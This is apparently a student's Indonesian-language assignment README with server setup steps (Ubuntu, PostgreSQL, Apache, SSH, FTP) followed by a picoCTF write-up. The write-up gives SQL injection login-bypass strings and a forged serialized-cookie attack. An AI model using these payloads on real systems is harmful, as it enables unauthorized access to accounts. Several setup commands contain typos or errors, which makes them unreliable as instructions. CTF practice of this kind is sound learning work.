# Tugas B201
## Install Ubuntu Server 18.04

1. Buat boot dari Iso Ubuntu 18.04 (rufus)
2. Ikuti langkah-langkah nya



## Install PostgreSQL from source

1. Download PostgreSQL source

    ``` https://www.postgresql.org/ftp/source/v12.2/ ```

2. Install readline agar tidak error saat configure

    ```$ sudo apt-get install libreadline-dev ```

3. Extract tar dari hasil download
    
    ```$ tar postgresql-12.2.tar.gz ```

4. Masuk ke directory hasil extract an

    ```$ cd postgresql-12.2 ```

5.  Ketikkan perintah

    ```$ ./configure ```

6. Setelah selesai, compile & make file

    ```$ make ```

    lalu

    ```$ make install ```

7. Buat postgre user dan buat user data

    ```$ adduser postgres ```

    ```$ passwd postgres ```

    ```$ mkdir /usr/local/pgsql/data```

    ```$ chown postgres -R /usr/local/pgsql/data ```


8. Inisiasi postgreSQL data directory

    ```$ su -l postgres ```

    ```$ initdb -D /usr/local/pgsql/data ```

9. Include Path ke terminal
    ```$ echo 'export PATH=$PATH:/usr/local/pgsql/bin' > /etc/profile.d/postgres.sh```

9. Nyalakan service postgre

    ```$ pg_ctl start -D /usr/local/pgsql/data ```

10. Cek proses pada postgre

    ```$ ps -ef |grep -i postgres ```

11. Masuk CLI postgre

    ```$ pgsql ```

## Install Apache
1. ```$ sudo apt get update ```

2. ```$ sudo apt-get install apache2 ```

3. ```$ sudo ufw allow 'Apache'```

    Start Apache

4. ```$ sudo /etc/init.d/apache2 start``` 

    restart Apache

5. ```$ sudo /etc/init.d/apache2 restart```

    Stop Apache
6. ```$ sudo /etc/init.d/apache2 stop ```

    Status Apache
7. ```$ sudo /etc/init.d/apache2 status```

<br>

## Install SSH
1. ```$ sudo apt update ```

2.  ```$ sudo apt install openssh-server```

3. ```$ sudo ufw allow ssh ```

4. ```$ sudo /etc/init.d/ssh status```

<br>

## Install FTP
1. ```$ sudo apt update```

2. ```$ sudo apt install vsftpd```

3. ```$ sudo service vsftpd status```

4. Configure firewall

    ```$ sudo ufw allow 20/tcp ```
    ```$ sudo ufw allow 20/tcp ```




# PicoCTF Suryo 
## Iris-Name-Repo-1

``` https://2019shell1.picoctf.com/problem/27383/ ```

* Solusi Menggunakan SQL Injection pada kolom username

    ``` ' OR '1'='1' -- ```

## Iris-Name-Repo-2
* Pada kasus ini, telah difilter beberapa kata yang ada pada mysql

* Solusinya menset admin menjadi

    ``` admin'--- ```

    dan Password terserah

## Iris-Name-Repo-3
* Pada kasus ini, sql injection lebih ketat dari sebelumnya. Sehingga kata-kata yang biasa digunakan dalam sql injection tidak bisa digunakan.

* Solusi dari kasus ini adalah menggunakan algoritme enkripsi sederhana ROT13

    ``` ' BE 1=1 -- ```

## Cereal Hacker 1
* Pada masalah ini, kita diharuskan mencari cookie yang digunakan pada kredensial login.

* Setelah memasukkan username : ``` guest ``` dan password: ```guest``` (Brute Force), maka akan didapat cookies berupa

    ```TzoxMToicGVybWlzc2lvbnMiOjI6e3M6ODoidXNlcm5hbWUiO3M6NToiZ3Vlc3QiO3M6ODoicGFzc3dvcmQiO3M6NToiZ3Vlc3QiO30%253D```

    <div style="color: blue;">
    (double urldecode + base64 decode)
    </div>

    didapatkan

    ``` O:11:"permissions":2{s:8:"username";s:5:"guest";s:8:"password";s:5:"guest";} ```

    apabila diset

    ``` O:11:"permissions":2{s:8:"username" s:5:"admin";s:8:"password";s:5:"' or '1'='1' --";}```

    akan muncul cookies baru

    ```TzoxMToicGVybWlzc2lvbnMiOjI6e3M6ODoidXNlcm5hbWUiO3M6NToiYWRtaW4iO3M6ODoicGFzc3dvcmQiO3M6MTE6Iicgb3IgJ0EnPSdBIjt9```

    dan saat dimasukkan ke halaman login maka akan muncul flag

















